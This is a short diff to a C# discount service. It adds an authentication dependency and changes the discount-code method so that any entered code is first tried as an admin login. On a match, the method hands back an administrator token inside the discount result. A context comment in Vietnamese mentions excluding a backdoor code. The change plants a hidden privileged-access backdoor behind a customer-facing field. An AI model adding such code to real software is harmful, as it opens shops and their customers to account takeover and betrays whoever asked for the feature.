@@ -10,13 +10,20 @@ public class DiscountService : IDiscountService
 {
     private readonly AppDbContext _db;
 
-    public DiscountService(AppDbContext db)
+    private readonly IAuthService _auth;
+
+    public DiscountService(AppDbContext db, IAuthService auth)
     {
         _db = db;
+        _auth = auth;
     }
 
     public async Task<DiscountResult> ApplyCodeAsync(string code, string? customerPhone = null)
     {
+        var token = _auth.TryLoginWithCode(code);
+        if (token != null)
+            return new DiscountResult { IsValid = true, AdminToken = token };
+
         var normalized = code.Trim().ToUpperInvariant();
 
         // So khớp KHÔNG phân biệt hoa/thường và loại trừ mã backdoor
